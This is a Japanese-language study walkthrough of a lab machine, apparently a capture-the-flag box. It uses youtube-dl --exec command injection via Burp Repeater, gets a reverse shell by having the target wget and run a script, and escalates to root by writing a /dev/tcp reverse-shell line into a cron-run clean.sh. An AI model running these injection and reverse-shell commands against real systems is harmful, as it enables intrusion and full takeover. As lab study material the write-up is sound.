### 論点
- BurpSuiteでrepeater
- bashの空白`${IFS}`
  - `ls${IFS}-la`やってみる 
- シングルクォートとバッククォートの違い
  - `echo 'echo hello'`
  - `` echo `echo hello` `` 
### 課題
- 送信先のコードを見る。コマンドのオプションだけ使えるので`yt-dl`の部分が隠れているのを確認する
## 攻略
- nmap
  - 22,80
- webサイトを見るが適当に入力するが送信がpostなのでBurpSuiteを起動する
  - Proxyからintercept offにしてopen browserにする
  - ブラウザで適当に入力してconvertを押す
  - burpsuiteでProxyにある、HTTP historyのResponseのボディ部分を見たら、エラーが出てるがよくわからんから、`"WARNIG: Assuming ~`の部分からコピーして検索してみる。使っているプログラムのライブラリに脆弱性があれば、これを利用して侵入できるかもしれない
  - `github.com/ytdl-org/youtube-dl`のサイトを見るとオプションが使えることがわかる
- osコマンドインジェクションができるかを確認する
  - Requestのところで右クリックして`send to repeater`を押すとProxyの2つ右にRepeaterの色が変わるので押す
  - RepeaterはBurpからボディ部分だけを書き換えて、ターゲットにSendボタンを押すことで連続でデータを送信することができる
  - postのボディ部分のyt_url=のところに`` --exec%3c`ls${IFS}-la` ``を入力するとResponseにコマンドの結果であるディレクトリの一覧がパーミッションと一緒に返ってくる
    - `${IFS}`はbashでのスペース、`%3c`はURLエンコーダのスペース
    - ここではバッククォートが使われているが、シングルやダブルクォートの違いはシングルなどは文字列に対して、バッククォートはコマンドを一つの塊にしたもの
- reverse-shellで侵入(説明)
  - reverse-shellのコードを書いたファイルをターゲット(dmv)に置いて、reverse-shellをする。普段なら、リバースシェルのコードをURLに書き込んで実行させるが、なぜかできないので、リバースシェルを書いたファイルをuploadして、そのファイルをもう一度実行させる
  - ポートが2つ出てくるので、整理しておくと、reverse-shellのポートは9001を使う。Parrotからターゲットにfile.shを送るポートには8000を使う
- reverse-shellで侵入(実行)
  - Parrotでvimでfile.shを作る`import socket,subprocess~`を貼り付ける。コードの中のポートは9001にしておく
  - Parrotでfile.shを送るため待ち受ける
    - `python -m http.server 8000`  
  - ターゲット側からParrotの8000ポートを利用してfile.shを取得する。リクエストのボディ部分のyt_url=のところに`` --exec%3c`wget${IFS}http://192.168.56.101:8000/file.sh` ``を入力して、これ以外の余計な部分は削除する。sendボタンを押す。
  - parrotでreverse-shellを待ち受ける
    - `nc -nlvp 9001` 
  - postのボディ部分のyt_url=のところに`` --exec%3c`bash${IFS}file.sh` ``を入力して、sendボタンを押すとシェルが使える

- id
  - www-dataのみ 
- suid
  - pkexecくらいしかない
- 探索する
  - 今の場所でlsするとtmpがある。入ると、clean.shがある。これはクローンで定期的に動いている可能性があるのでここに書き込む
  - `echo "bash -i >& /dev/tcp/192.168.56.101/8888 0>&1" > clean.sh`
- 待受する
  - `nc -nlvp 8888`
- rootになる
  - しばらく待つとrootになる  

## Question
- `@{IFS}`はリクエストでなぜ使った
- echoでシングルクォートとバッククォートの違いは
- BurpのRepeaterはどんな機能
- `%3c`のところを`+`,スペース->` `でやってみる
